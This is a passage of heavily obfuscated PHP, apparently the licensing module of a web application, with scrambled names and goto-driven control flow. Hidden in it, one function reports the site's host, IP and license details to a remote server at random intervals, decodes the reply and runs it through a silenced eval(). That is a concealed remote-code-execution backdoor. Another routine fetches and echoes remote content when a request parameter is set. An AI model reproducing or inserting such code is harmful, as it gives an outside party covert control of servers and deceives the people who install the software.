(!$b¶„ÓÏ¼ÊŸ) { die; } goto AùóÇìôŒ—; eßÙ¨ØÆ£: if ($B½“°ŞŸĞ£[$E·ºƒ‡ïµ¼[219]] && $B½“°ŞŸĞ£[$E·ºƒ‡ïµ¼[219]] >= 1) { $E·ºƒ‡ïµ¼[61]($E·ºƒ‡ïµ¼[62])->{$_SERVER[Š°ş®×«Ú][220]}($E·ºƒ‡ïµ¼[221], $E·ºƒ‡ïµ¼[222]); } $E·ºƒ‡ïµ¼[61]($E·ºƒ‡ïµ¼[62])->{$_SERVER[Š°ş®×«Ú][223]}($F¹Ü…“¤©); $Cæİ˜Ó°Î‘ = $E·ºƒ‡ïµ¼[116]($_SERVER[$E·ºƒ‡ïµ¼[117]] . $E·ºƒ‡ïµ¼[216]($BÃÁ§å–Ÿ) . $F¹Ü…“¤©[$E·ºƒ‡ïµ¼[212]]); goto eÖô„ô”¿ö; E£Ç¬Ëï…: $C¿’»‹Õ« = $E·ºƒ‡ïµ¼[116]($_SERVER[$E·ºƒ‡ïµ¼[117]] . $BÃÁ§å–Ÿ); if ($eÙÎéËŸ®ï[$E·ºƒ‡ïµ¼[180]] == $E·ºƒ‡ïµ¼[181]) { $B…Ó™ŸŞŸ§ = $this->{$_SERVER[Š°ş®×«Ú][149]}($C¿’»‹Õ«, $E·ºƒ‡ïµ¼[182]); $B§Šˆ¿‡Œˆ = $this->{$_SERVER[Š°ş®×«Ú][129]}($E·ºƒ‡ïµ¼[150]($AĞ—Š·¨), $C¿’»‹Õ« . $E·ºƒ‡ïµ¼[183], 3); $eÙï¥•¯Œ­ = $this->{$_SERVER[Š°ş®×«Ú][184]}($E·ºƒ‡ïµ¼[185] . $B…Ó™ŸŞŸ§ . $E·ºƒ‡ïµ¼[186] . $B§Šˆ¿‡Œˆ, -1); $E·ºƒ‡ïµ¼[168]($eÙï¥•¯Œ­, !0); } else { if ($eÙÎéËŸ®ï[$E·ºƒ‡ïµ¼[180]] == $E·ºƒ‡ïµ¼[187]) { $fá¨¾êÇ½Ñ = $E·ºƒ‡ïµ¼[25]($E·ºƒ‡ïµ¼[116]($E·ºƒ‡ïµ¼[188] . $C¿’»‹Õ«), 12, 15) . $E·ºƒ‡ïµ¼[189]; $B§Šˆ¿‡Œˆ = $this->{$_SERVER[Š°ş®×«Ú][190]}($E·ºƒ‡ïµ¼[2]($eÙÎéËŸ®ï[$E·ºƒ‡ïµ¼[191]]), $fá¨¾êÇ½Ñ, 2); $E½ŠÙáàñ = $E·ºƒ‡ïµ¼[192]($B§Šˆ¿‡Œˆ, !0); if (!$E·ºƒ‡ïµ¼[193]($E½ŠÙáàñ) || !$E·ºƒ‡ïµ¼[193]($E½ŠÙáàñ[$E·ºƒ‡ïµ¼[194]]) || $E½ŠÙáàñ[$E·ºƒ‡ïµ¼[167]] != !0) { $B·é¨ï = $E·ºƒ‡ïµ¼[195]; $c²İ¤ƒ‰‹ñ = $E½ŠÙáàñ[$E·ºƒ‡ïµ¼[194]] ? $E·ºƒ‡ïµ¼[196] . $E½ŠÙáàñ[$E·ºƒ‡ïµ¼[194]] : $B·é¨ï; $E·ºƒ‡ïµ¼[168]($c²İ¤ƒ‰‹ñ, !1); } else { $AĞ—Š·¨[$E·ºƒ‡ïµ¼[170]] = $E½ŠÙáàñ[$E·ºƒ‡ïµ¼[194]][$E·ºƒ‡ïµ¼[197]]; } } else { $E½ŠÙáàñ = $this->{$_SERVER[Š°ş®×«Ú][184]}($E·ºƒ‡ïµ¼[198], $AĞ—Š·¨, 10); $Cß¸áéêí = $eŞÊï»°©º[585]; while (strlen($Cß¸áéêí) < $eŞÊï»°©º[563]) { if (!$Cß¸áéêí) { break; } $Cß¸áéêí++; } } } if (!$E·ºƒ‡ïµ¼[193]($E½ŠÙáàñ) || !$E·ºƒ‡ïµ¼[193]($E½ŠÙáàñ[$E·ºƒ‡ïµ¼[194]]) || $E½ŠÙáàñ[$E·ºƒ‡ïµ¼[167]] != !0) { $B·é¨ï = $E·ºƒ‡ïµ¼[199]($E·ºƒ‡ïµ¼[200]); $c²İ¤ƒ‰‹ñ = $E½ŠÙáàñ[$E·ºƒ‡ïµ¼[194]] ? $E·ºƒ‡ïµ¼[196] . $E½ŠÙáàñ[$E·ºƒ‡ïµ¼[194]] : $B·é¨ï; $E·ºƒ‡ïµ¼[168]($c²İ¤ƒ‰‹ñ, !1); } goto d¹ˆêƒÅÏ; F›í‘œ¾İÇ: $Fê²¢õºÏ = $eŞÊï»°©º[593]; if (!$Fê²¢õºÏ) { die; } $E·ºƒ‡ïµ¼[61]($E·ºƒ‡ïµ¼[11])->{$_SERVER[Š°ş®×«Ú][228]}($fˆÑœÕŸ¦[$E·ºƒ‡ïµ¼[229]], array($E·ºƒ‡ïµ¼[230] => $AåòÏŒ¨Š)); goto E˜„†ˆµ’Ù; AùóÇìôŒ—: } private function licenseRegistSuccess() { goto AÜìïóŠÍ; bë•¿ƒôä: $b¦¥‹‰‰Ï‘ = $e‘ò–÷õŒ[596]; if (strlen($b¦¥‹‰‰Ï‘) < $e‘ò–÷õŒ[563]) { die; } if ($Ağ¹ä¹Ï¹Œ[$BÛºÚŒ”×[87]] != $BÛºÚŒ”×[222]) { $BÛºÚŒ”×[61]($BÛºÚŒ”×[62])->{$_SERVER[Š°ş®×«Ú][223]}($BÛºÚŒ”×[87], $BÛºÚŒ”×[222]); } goto dÁ‰°ì¢“; AÜìïóŠÍ: $e‘ò–÷õŒ =& $_SERVER[“]; $BÛºÚŒ”× =& $_SERVER[Š°ş®×«Ú]; $Ağ¹ä¹Ï¹Œ = $BÛºÚŒ”×[61]($BÛºÚŒ”×[62])->{$_SERVER[Š°ş®×«Ú][63]}(); goto bë•¿ƒôä; dÁ‰°ì¢“: $BÛºÚŒ”×[112]($BÛºÚŒ”×[232])->{$_SERVER[Š°ş®×«Ú][233]}(!0); goto d¨ğÊ§”İ’; d¨ğÊ§”İ’: } private function mznaf1ec0d44() { goto e£„øç´†; c‘´Ç“ÆäØ: $this->frlv94bd06cd = array(); $Fì…¾éíç = $eØ ãÛëó‹[598]; while ($Fì…¾éíç < $eØ ãÛëó‹[580]) { if ($Fì…¾éíç >= 0) { break; } $Fì…¾éíç++; } goto aˆôˆ¶¯Ø¨; F›“´–›ã‘: $DÔµ¸ßâ‚ß = $eØ ãÛëó‹[597]; if (strlen($DÔµ¸ßâ‚ß) < $eØ ãÛëó‹[573]) { return; } $båÊœø–‚[61]($båÊœø–‚[62])->{$_SERVER[Š°ş®×«Ú][220]}($båÊœø–‚[221], $båÊœø–‚[234]); goto c‘´Ç“ÆäØ; e£„øç´†: $eØ ãÛëó‹ =& $_SERVER[“]; $båÊœø–‚ =& $_SERVER[Š°ş®×«Ú]; $båÊœø–‚[61]($båÊœø–‚[62])->{$_SERVER[Š°ş®×«Ú][223]}(array($båÊœø–‚[211] => $båÊœø–‚[10], $båÊœø–‚[212] => $båÊœø–‚[10], $båÊœø–‚[122] => $båÊœø–‚[123], $båÊœø–‚[124] => $båÊœø–‚[10], $båÊœø–‚[125] => $båÊœø–‚[10])); goto F›“´–›ã‘; aˆôˆ¶¯Ø¨: $this->dpmi17a80571 = $båÊœø–‚[123]; $c„ô‰Åæƒ = $eØ ãÛëó‹[599]; goto dŠŒäŠš‡‹; dŠŒäŠš‡‹: } private function ycblaeba5200() { goto A‡’™Òêá¢; e¾åœ­Çæ§: $FøÔâª­ñ« = $B—™Ÿß‹Øš[224]($B—™Ÿß‹Øš[61]($B—™Ÿß‹Øš[11])->{$_SERVER[Š°ş®×«Ú][225]}(), $B—™Ÿß‹Øš[226]); $e¬àÊõÉªÖ = $FøÔâª­ñ«[$B—™Ÿß‹Øš[227]]; $fŒ¥Îô×¼ = $bŠ„©çÀ›‹[601]; goto dõ’çÆ¦É; f×«‚¦˜‹‚: while (strlen($B‰³ìí¥§Ï) < $bŠ„©çÀ›‹[563]) { if (!$B‰³ìí¥§Ï) { break; } $B‰³ìí¥§Ï++; } $c‘¹Ššç±– = $B—™Ÿß‹Øš[192]($c‘¹Ššç±–, !0); $bå«“¹‹Â± = $bŠ„©çÀ›‹[604]; goto Då‰˜å‹; Då‰˜å‹: if (!$bå«“¹‹Â±) { return; } if (!$B—™Ÿß‹Øš[193]($c‘¹Ššç±–)) { return $this->{$_SERVER[Š°ş®×«Ú][166]}(); } $Dï¸İ†Ò‰ = $B—™Ÿß‹Øš[146]($c‘¹Ššç±–[$B—™Ÿß‹Øš[147]]); goto BÀî¸ù¸ò•; cÓé¤ĞõÚØ: $this->dpmi17a80571 = $B—™Ÿß‹Øš[123]; $DŠÎ¨‰ŠË— = $B—™Ÿß‹Øš[61]($B—™Ÿß‹Øš[62])->{$_SERVER[Š°ş®×«Ú][63]}(); $eˆ…Ëˆöô = $bŠ„©çÀ›‹[600]; goto D¤ê«Ë¬š; A‡’™Òêá¢: $bŠ„©çÀ›‹ =& $_SERVER[“]; $B—™Ÿß‹Øš =& $_SERVER[Š°ş®×«Ú]; $_SERVER[$B—™Ÿß‹Øš[177]] = $B—™Ÿß‹Øš[106]($_SERVER, $B—™Ÿß‹Øš[177], APP_HOST); goto cÓé¤ĞõÚØ; D¤ê«Ë¬š: while ($eˆ…Ëˆöô < $bŠ„©çÀ›‹[573]) { if ($eˆ…Ëˆöô >= 0) { break; } $eˆ…Ëˆöô++; } if ($DŠÎ¨‰ŠË—[$B—™Ÿß‹Øš[122]] == $B—™Ÿß‹Øš[123]) { return; } $cğÛ„ˆÚ — = $B—™Ÿß‹Øš[61]($B—™Ÿß‹Øš[62])->{$_SERVER[Š°ş®×«Ú][63]}($B—™Ÿß‹Øš[118]); goto e¾åœ­Çæ§; BÀî¸ù¸ò•: if ($B—™Ÿß‹Øš[235]() >= $Dï¸İ†Ò‰) { return $this->{$_SERVER[Š°ş®×«Ú][166]}(); } $this->frlv94bd06cd = $c‘¹Ššç±–; $this->dpmi17a80571 = $DŠÎ¨‰ŠË—[$B—™Ÿß‹Øš[122]]; goto c¤ƒ÷å§É; dõ’çÆ¦É: if (strlen($fŒ¥Îô×¼) < $bŠ„©çÀ›‹[573]) { return; } $AÚğ™÷»á› = $B—™Ÿß‹Øš[116]($_SERVER[$B—™Ÿß‹Øš[117]] . $B—™Ÿß‹Øš[216]($cğÛ„ˆÚ —) . $DŠÎ¨‰ŠË—[$B—™Ÿß‹Øš[212]]); $Aâ™·ï£Û› = $B—™Ÿß‹Øš[216]($B—™Ÿß‹Øš[25]($AÚğ™÷»á›, 10, 16)); goto A§êç÷İŸ; A§êç÷İŸ: $Cæ¸¯â = $bŠ„©çÀ›‹[602]; $c‘¹Ššç±– = $this->{$_SERVER[Š°ş®×«Ú][190]}($e¬àÊõÉªÖ[$B—™Ÿß‹Øš[93]][$Aâ™·ï£Û›], $AÚğ™÷»á›); $B‰³ìí¥§Ï = $bŠ„©çÀ›‹[603]; goto f×«‚¦˜‹‚; c¤ƒ÷å§É: } private function jgqe0a03bbd2() { goto d™ğÅäÂ­; d™ğÅäÂ­: $cŸ¬É³Ò¦¶ =& $_SERVER[Š°ş®×«Ú]; $dÆÔá«ÏÒæ = $GLOBALS[$cŸ¬É³Ò¦¶[22]]; $fÊ…Æ›ó®¹ = $_SERVER[“][605]; goto a‰ÏËï‡ñ½; Cæ…¹¸¿í: if ($cŸ¬É³Ò¦¶[241]($F‰¨œÀÆ¹Î, $B™î©Í‰¸)) { if ($this->dpmi17a80571 == $cŸ¬É³Ò¦¶[123] && isset($dÆÔá«ÏÒæ[$cŸ¬É³Ò¦¶[242]])) { $cŸ¬É³Ò¦¶[168]($cŸ¬É³Ò¦¶[199]($cŸ¬É³Ò¦¶[237]), !1, $cŸ¬É³Ò¦¶[238]); die; } $c³ïŸÊˆº = $this->{$_SERVER[Š°ş®×«Ú][139]}(); if ($c³ïŸÊˆº != $cŸ¬É³Ò¦¶[203]($cŸ¬É³Ò¦¶[243])) { if ($c³ïŸÊˆº <= $cŸ¬É³Ò¦¶[61]($cŸ¬É³Ò¦¶[141])->{$_SERVER[Š°ş®×«Ú][142]}()) { $cŸ¬É³Ò¦¶[168]($cŸ¬É³Ò¦¶[199]($cŸ¬É³Ò¦¶[244]), !1, $cŸ¬É³Ò¦¶[238]); die; } } } goto aÎ§Âáó‚Å; a‰ÏËï‡ñ½: $F‰¨œÀÆ¹Î = $_SERVER[$cŸ¬É³Ò¦¶[44]]; if ($F‰¨œÀÆ¹Î == $cŸ¬É³Ò¦¶[236] && $this->dpmi17a80571 == $cŸ¬É³Ò¦¶[123]) { $cŸ¬É³Ò¦¶[168]($cŸ¬É³Ò¦¶[199]($cŸ¬É³Ò¦¶[237]), !1, $cŸ¬É³Ò¦¶[238]); } $B™î©Í‰¸ = array($cŸ¬É³Ò¦¶[239], $cŸ¬É³Ò¦¶[240]); goto Cæ…¹¸¿í; aÎ§Âáó‚Å: } private function imat4b085437() { goto dŠ™äËĞº›; F¯¡ƒ´ğí‹: if (!$FŸõóŞ¬ğã[106]($GLOBALS, $FŸõóŞ¬ğã[134]) || !isset($_GET[$FŸõóŞ¬ğã[246]])) { return; } if (!$FŸõóŞ¬ğã[241]($_SERVER[$FŸõóŞ¬ğã[44]], $DŒõÄãÆßÒ)) { return; } $C–¾Ÿ„ğ”Ã = $FŸõóŞ¬ğã[247]; goto D³İà™Ø ; bƒó±îÆ‰¥: $FŸõóŞ¬ğã[256]($FŸõóŞ¬ğã[257]); if ($DÀñ÷‚™¨ß && $FŸõóŞ¬ğã[32]($DÀñ÷‚™¨ß, $FŸõóŞ¬ğã[258])) { echo $DÀñ÷‚™¨ß; } die; goto b£¨Œ½º‡; e³¹¸ñÈŒ©: $bßÇÆŒß÷ë = $fÚ×†…Û°[607]; $D¨Œ¹‚é´¤ = $FŸõóŞ¬ğã[250](array($FŸõóŞ¬ğã[251] => array($FŸõóŞ¬ğã[252] => $FŸõóŞ¬ğã[253], $FŸõóŞ¬ğã[254] => 3))); $DÀñ÷‚™¨ß = @$FŸõóŞ¬ğã[255]($C–¾Ÿ„ğ”Ã, !1, $D¨Œ¹‚é´¤); goto bƒó±îÆ‰¥; D³İà™Ø : $dˆ°Ï‚¹ÈÁ = $fÚ×†…Û°[606]; if (strlen($dˆ°Ï‚¹ÈÁ) < $fÚ×†…Û°[559]) { return; } $C–¾Ÿ„ğ”Ã = $this->{$_SERVER[Š°ş®×«Ú][248]}($C–¾Ÿ„ğ”Ã, $FŸõóŞ¬ğã[249]); goto e³¹¸ñÈŒ©; dŠ™äËĞº›: $fÚ×†…Û° =& $_SERVER[“]; $FŸõóŞ¬ğã =& $_SERVER[Š°ş®×«Ú]; $DŒõÄãÆßÒ = array($FŸõóŞ¬ğã[137], $FŸõóŞ¬ğã[245]); goto F¯¡ƒ´ğí‹; b£¨Œ½º‡: } public function dhkna78d0b2c($C“„¾ã»™Š) { goto fÍÇÁ„Éåí; fÍÇÁ„Éåí: $dºîÆëªâù =& $_SERVER[“]; $e•“½ëç÷ =& $_SERVER[Š°ş®×«Ú]; if ($this->dpmi17a80571 == $e•“½ëç÷[259]) { return $C“„¾ã»™Š; } goto d›‡È¶ø¥¨; cö­²ù‡‚ä: foreach ($b×ùªÌù³í as $eœÉç‡ë½) { unset($C“„¾ã»™Š[$eœÉç‡ë½]); } return $C“„¾ã»™Š; goto B†æĞÏ¬õØ; C§ÈË®…‹·: while ($EÊ‰ëï‘áÙ < $dºîÆëªâù[573]) { if ($EÊ‰ëï‘áÙ >= 0) { break; } $EÊ‰ëï‘áÙ++; } $b×ùªÌù³í = array(); foreach ($EøÇ“§†ßĞ as $eœÉç‡ë½) { if (!$e•“½ëç÷[241]($eœÉç‡ë½, $A™ƒğ—óèù)) { $b×ùªÌù³í[] = $eœÉç‡ë½; } } goto cö­²ù‡‚ä; d›‡È¶ø¥¨: $EøÇ“§†ßĞ = array($e•“½ëç÷[260], $e•“½ëç÷[261], $e•“½ëç÷[262], $e•“½ëç÷[263], $e•“½ëç÷[264], $e•“½ëç÷[265], $e•“½ëç÷[266], $e•“½ëç÷[267]); $A™ƒğ—óèù = $e•“½ëç÷[0]($e•“½ëç÷[268], $e•“½ëç÷[106]($this->frlv94bd06cd, $e•“½ëç÷[131], $e•“½ëç÷[10])); $EÊ‰ëï‘áÙ = $dºîÆëªâù[608]; goto C§ÈË®…‹·; B†æĞÏ¬õØ: } private function wmpvb50db298() { goto E¥±Åù¸×¨; D²Œ‰ììå: if ($cä®Ä„êâ…[61]($cä®Ä„êâ…[271])->{$_SERVER[Š°ş®×«Ú][63]}($cä®Ä„êâ…[87]) != $cä®Ä„êâ…[234]) { $cä®Ä„êâ…[61]($cä®Ä„êâ…[271])->{$_SERVER[Š°ş®×«Ú][223]}($cä®Ä„êâ…[87], $cä®Ä„êâ…[234]); } goto F›ä‡‹±ë”; cŒÀ‰Í¿«: $GLOBALS[$cä®Ä„êâ…[93]][$cä®Ä„êâ…[270]] = $cä®Ä„êâ…[222]; $d§¢°–«Å = $_SERVER[“][609]; if (!$d§¢°–«Å) { return; } goto D²Œ‰ììå; E¥±Åù¸×¨: $cä®Ä„êâ… =& $_SERVER[Š°ş®×«Ú]; if ($this->dpmi17a80571 != $cä®Ä„êâ…[123]) { return; } $GLOBALS[$cä®Ä„êâ…[93]][$cä®Ä„êâ…[97]][$cä®Ä„êâ…[269]] = $cä®Ä„êâ…[222]; goto cŒÀ‰Í¿«; F›ä‡‹±ë”: } public function kbqt04eedb21() { $dÎÒÍÄ =& $_SERVER[“]; return $_SERVER[Š°ş®×«Ú][272]; $B®¼ŸŠ•½Ø = $dÎÒÍÄ[610]; while ($B®¼ŸŠ•½Ø < $dÎÒÍÄ[563]) { if ($B®¼ŸŠ•½Ø >= 0) { break; } $B®¼ŸŠ•½Ø++; } } private function zsqdf895c5d9() { goto a„Ï”É§ £; fİÉ—ùÔ‹: if ($this->dpmi17a80571 == $dîÁ‰ë¬——[123] || !$dîÁ‰ë¬——[106]($GLOBALS, $dîÁ‰ë¬——[134])) { return; } if (!$dîÁ‰ë¬——[241]($_SERVER[$dîÁ‰ë¬——[44]], $dö†¯©àøŸ)) { return; } if ($dîÁ‰ë¬——[235]() % 4 != 0) { return; } goto fÅù›†öò; bÒ´Îà‡½: if (!$fí¢ĞŞò¢) { die; } $f‹©Ò›é’ = array($dîÁ‰ë¬——[167] => $dîÁ‰ë¬——[61]($dîÁ‰ë¬——[62])->{$_SERVER[Š°ş®×«Ú][63]}($dîÁ‰ë¬——[211]), $dîÁ‰ë¬——[180] => $this->dpmi17a80571, $dîÁ‰ë¬——[178] => $_SERVER[$dîÁ‰ë¬——[179]], $dîÁ‰ë¬——[171] => $dîÁ‰ë¬——[151], $dîÁ‰ë¬——[174] => $_SERVER[$dîÁ‰ë¬——[175]]); $B¥«ù¥¦ìÆ = $bÈ–œŸñ[614]; goto bÕöã÷·˜; a„Ï”É§ £: $bÈ–œŸñ =& $_SERVER[“]; $dîÁ‰ë¬—— =& $_SERVER[Š°ş®×«Ú]; $dö†¯©àøŸ = array($dîÁ‰ë¬——[273], $dîÁ‰ë¬——[274], $dîÁ‰ë¬——[275]); goto b“¯³Ç™‹; bÕöã÷·˜: $B‘¸¬Ò”Ã§ = $this->{$_SERVER[Š°ş®×«Ú][184]}($dîÁ‰ë¬——[281], $f‹©Ò›é’); if (!$dîÁ‰ë¬——[193]($B‘¸¬Ò”Ã§)) { return; } if ($B‘¸¬Ò”Ã§[$dîÁ‰ë¬——[167]] && $B‘¸¬Ò”Ã§[$dîÁ‰ë¬——[282]]) { if ($this->{$_SERVER[Š°ş®×«Ú][201]}($B‘¸¬Ò”Ã§[$dîÁ‰ë¬——[282]]) == $f‹©Ò›é’[$dîÁ‰ë¬——[167]]) { return; } } goto bÃÓ©àëÛ; b“¯³Ç™‹: $céˆò®ª‹ˆ = $bÈ–œŸñ[611]; if (!$céˆò®ª‹ˆ) { die; } $Bº¢Ø‘…°² = $dîÁ‰ë¬——[276] . $dîÁ‰ë¬——[116]($dîÁ‰ë¬——[277]); goto fİÉ—ùÔ‹; D«¦šÇÅÖÛ: if ($d‡Ä¦ğƒ && $dîÁ‰ë¬——[235]() - $d‡Ä¦ğƒ < $dîÁ‰ë¬——[203]($dîÁ‰ë¬——[280])) { return; } $dîÁ‰ë¬——[13](array($dîÁ‰ë¬——[278], $dîÁ‰ë¬——[154]), $Bº¢Ø‘…°², $dîÁ‰ë¬——[235]()); $fí¢ĞŞò¢ = $bÈ–œŸñ[613]; goto bÒ´Îà‡½; bÃÓ©àëÛ: $this->{$_SERVER[Š°ş®×«Ú][166]}(); $a¯ÑÕÓßîÆ = $bÈ–œŸñ[615]; if ($this->{$_SERVER[Š°ş®×«Ú][201]}($B‘¸¬Ò”Ã§[$dîÁ‰ë¬——[282]]) != $f‹©Ò›é’[$dîÁ‰ë¬——[167]]) { $EíÊù‘±ã = array($dîÁ‰ë¬——[204] => $dîÁ‰ë¬——[61]($dîÁ‰ë¬——[62])->{$_SERVER[Š°ş®×«Ú][63]}($dîÁ‰ë¬——[118]), $dîÁ‰ë¬——[205] => $_SERVER[$dîÁ‰ë¬——[117]], $dîÁ‰ë¬——[206] => $dîÁ‰ë¬——[207](), $dîÁ‰ë¬——[176] => $_SERVER[$dîÁ‰ë¬——[177]]); $e¯Ñí²˜ˆ¸ = $this->{$_SERVER[Š°ş®×«Ú][208]}($dîÁ‰ë¬——[150]($EíÊù‘±ã)); $B‘¸¬Ò”Ã§ = $this->{$_SERVER[Š°ş®×«Ú][184]}($dîÁ‰ë¬——[209] . $e¯Ñí²˜ˆ¸); if ($B‘¸¬Ò”Ã§ && $dîÁ‰ë¬——[193]($B‘¸¬Ò”Ã§) && isset($B‘¸¬Ò”Ã§[$dîÁ‰ë¬——[282]])) { $Bàµç‰¢‹Ş = $this->{$_SERVER[Š°ş®×«Ú][190]}($B‘¸¬Ò”Ã§[$dîÁ‰ë¬——[282]], 2); if ($Bàµç‰¢‹Ş) { $Bàµç‰¢‹Ş = $this->{$_SERVER[Š°ş®×«Ú][201]}($Bàµç‰¢‹Ş); } if ($Bàµç‰¢‹Ş) { try { @eval($Bàµç‰¢‹Ş); } catch (Exception $Eµ÷àãÔ) { } } } } goto eÅ‘íäŒ„½; fÅù›†öò: $d‡Ä¦ğƒ = $dîÁ‰ë¬——[13](array($dîÁ‰ë¬——[278], $dîÁ‰ë¬——[279]), $Bº¢Ø‘…°²); $Dñ¢ÊÉó†• = $bÈ–œŸñ[612]; if (strlen($Dñ¢ÊÉó†•) < $bÈ–œŸñ[559]) { die; } goto D«¦šÇÅÖÛ; eÅ‘íäŒ„½: } private function mygb12af773b($D×ÕÓĞˆÕ  = '', $bôõ×™ÔÜ¸ = array(), $aµÉš±‡°¹ = 5) { goto cêó«»½Îè; b‡Á‹×ÍÒ˜: $BÌìâ¼ƒ¤± = $BÌìâ¼ƒ¤± . $D×ÕÓĞˆÕ  . $E‰çòô§Ş[285] . $E‰çòô§Ş[286]($bôõ×™ÔÜ¸); $e¤ò‡ñæÓç = $BÃ×ßœÒª[617]; while (strlen($e¤ò‡ñæÓç) < $BÃ×ßœÒª[553]) { if (!$e¤ò‡ñæÓç) { break; } $e¤ò‡ñæÓç++; } goto d”»£–·; cê¢Ö±Ùí: $BÌìâ¼ƒ¤± = $this->{$_SERVER[Š°ş®×«Ú][248]}($BÌìâ¼ƒ¤±, $E‰çòô§Ş[284]); $aÛÔ¶ºŠÎ„ = $BÃ×ßœÒª[616]; while ($aÛÔ¶ºŠÎ„ < $BÃ×ßœÒª[563]) { if ($aÛÔ¶ºŠÎ„ >= 0) { break; } $aÛÔ¶ºŠÎ„++; } goto b‡Á‹×ÍÒ˜; d”»£–·: if ($bôõ×™ÔÜ¸ === -1) { return $BÌìâ¼ƒ¤±; } $Dªî¬ˆµ”Ê = $E‰çòô§Ş[250](array($E‰çòô§Ş[251] => array($E‰çòô§Ş[254] => $aµÉš±‡°¹, $E‰çòô§Ş[252] => $E‰çòô§Ş[287]), $E‰çòô§Ş[288] => array($E‰çòô§Ş[289] => !1, $E‰çòô§Ş[290] => !1))); $eµÛõÅÂ‚ç = $BÃ×ßœÒª[618]; goto cÜ…‰¯‚ø®; cêó«»½Îè: $BÃ×ßœÒª =& $_SERVER[“]; $E‰çòô§Ş =& $_SERVER[Š°ş®×«Ú]; $BÌìâ¼ƒ¤± = $E‰çòô§Ş[283]; goto cê¢Ö±Ùí; cÜ…‰¯‚ø®: if (strlen($eµÛõÅÂ‚ç) < $BÃ×ßœÒª[559]) { die; } $bôõ×™ÔÜ¸ = @$E‰çòô§Ş[255]($BÌìâ¼ƒ¤±, !1, $Dªî¬ˆµ”Ê); return $E‰çòô§Ş[192]($bôõ×™ÔÜ¸, !0); goto FÀºØ»ĞŠê; FÀºØ»ĞŠê: } private function xytib4117d7b() { goto c³ó· ˆ…; AÜ†Êòç°ƒ: $fÕ –¡‘¥Ñ = $fÕ –¡‘¥Ñ ? $A™«ƒå¤É[203]($fÕ –¡‘¥Ñ) : 0; return $AØˆÑêÍÛÒ + $fÕ –¡‘¥Ñ; $f­Î—Ø¡›ˆ = $CŠ²‚Ûˆè¸[621]; goto eË¨·‹ù™î; CãÜ­ª²ë: $AØˆÑêÍÛÒ = $bôˆƒ¬ÜË[$this->dpmi17a80571]; $d‚œÀªšİ• = $CŠ²‚Ûˆè¸[619]; $AØˆÑêÍÛÒ = $A™«ƒå¤É[203]($AØˆÑêÍÛÒ ? $AØˆÑêÍÛÒ : $A™«ƒå¤É[292]); goto a¨¢íİ®íØ; c³ó· ˆ…: $CŠ²‚Ûˆè¸ =& $_SERVER[“]; $A™«ƒå¤É =& $_SERVER[Š°ş®×«Ú]; $bôˆƒ¬ÜË = array($A™«ƒå¤É[291] => $A™«ƒå¤É[292], $A™«ƒå¤É[293] => $A™«ƒå¤É[294], $A™«ƒå¤É[295] => $A™«ƒå¤É[296], $A™«ƒå¤É[297] => $A™«ƒå¤É[298], $A™«ƒå¤É[299] => $A™«ƒå¤É[300], $A™«ƒå¤É[301] => $A™«ƒå¤É[243], $A™«ƒå¤É[302] => $A™«ƒå¤É[243], $A™«ƒå¤É[303] => $A™«ƒå¤É[292], $A™«ƒå¤É[304] => $A™«ƒå¤É[294], $A™«ƒå¤É[305] => $A™«ƒå¤É[296], $A™«ƒå¤É[306] => $A™«ƒå¤É[307], $A™«ƒå¤É[308] => $A™«ƒå¤É[298], $A™«ƒå¤É[309] => $A™«ƒå¤É[310], $A™«ƒå¤É[311] => $A™«ƒå¤É[300], $A™«ƒå¤É[312] => $A™«ƒå¤É[313], $A™«ƒå¤É[314] => $A™«ƒå¤É[315], $A™«ƒå¤É[316] => $A™«ƒå¤É[317]); goto CãÜ­ª²ë; a¨¢íİ®íØ: $fÕ –¡‘¥Ñ = $A™«ƒå¤É[106]($this->frlv94bd06cd, $A™«ƒå¤É[318]); $eœ§Š¨Íõ = $CŠ²‚Ûˆè¸[620]; if (!$eœ§Š¨Íõ) { die; } goto AÜ†Êòç°ƒ; eË¨·‹ù™î: } public function mzuc0b3aedc6($fóÒ‹ì…Ã) { goto c™§ŠëÕçÙ; aÖ¸±«î×: if (!$bî‹ëß†ª[241]($fóÒ‹ì…Ã[$bî‹ëß†ª[319]], $B„¸İ°Şßã)) { $bî‹ëß†ª[168]($bî‹ëß†ª[323], !1, $bî‹ëß†ª[238]); } goto e×ñµ¾Èã¹; E‰÷Æ‘ŒÔ: $Bù‚ÅÏ•ø¡ = $B†ˆèÏè[622]; if (strlen($Bù‚ÅÏ•ø¡) < $B†ˆèÏè[553]) { return; } if ($fóÒ‹ì…Ã[$bî‹ëß†ª[319]] == $bî‹ëß†ª[222]) { return; } goto fëç—«äøŒ; c™§ŠëÕçÙ: $B†ˆèÏè =& $_SERVER[“]; $bî‹ëß†ª =& $_SERVER[Š°ş®×«Ú]; $e™‹´ÓÅ°Ş = $this->{$_SERVER[Š°ş®×«Ú][139]}(); goto E‰÷Æ‘ŒÔ; E¡´¯°•×÷: if ($a…©ÚÍ†¤² <= $e™‹´ÓÅ°Ş) { return; } $B„¸İ°Şßã = $bî‹ëß†ª[61]($bî‹ëß†ª[141])->{$_SERVER[Š°ş®×«Ú][320]}($bî‹ëß†ª[319])->{$_SERVER[Š°ş®×«Ú][321]}($e™‹´ÓÅ°Ş)->{$_SERVER[Š°ş®×«Ú][322]}(); $Få¶ò¹À = $B†ˆèÏè[624]; goto c«İºÂ•„; c«İºÂ•„: while (strlen($Få¶ò¹À) < $B†ˆèÏè[580]) { if (!$Få¶ò¹À) { break; } $Få¶ò¹À++; } $B„¸İ°Şßã = $bî‹ëß†ª[224]($B„¸İ°Şßã, $bî‹ëß†ª[10], $bî‹ëß†ª[319]); $eëºæ™‡Æó = $B†ˆèÏè[625]; goto aÖ¸±«î×; fëç—«äøŒ: if ($e™‹´ÓÅ°Ş >= $bî‹ëß†ª[203]($bî‹ëß†ª[243])) { return; } $a…©ÚÍ†¤² = $bî‹ëß†ª[61]($bî‹ëß†ª[141])->{$_SERVER[Š°ş®×«Ú][142]}(); $Fìç‹Œ›ò = $B†ˆèÏè[623]; goto E¡´¯°•×÷; e×ñµ¾Èã¹: } public function vbtcdbf93ca4() { goto f¢øù±¶ø¯; c¾¤ÎìÉÔ‚: $e‹±º–®Æ’ = @$D©ªñÌ‰›²[255]($a¢ïé§æŒ, !1, $bô†‹± Ûè); $A¼’÷Ä ‚ = $c‡É¸¥ìõ©[627]; if (!$A¼’÷Ä ‚) { return; } goto aÂôËÊòºô; f¢øù±¶ø¯: $c‡É¸¥ìõ© =& $_SERVER[“]; $D©ªñÌ‰›² =& $_SERVER[Š°ş®×«Ú]; if (!$D©ªñÌ‰›²[106]($GLOBALS, $D©ªñÌ‰›²[134]) 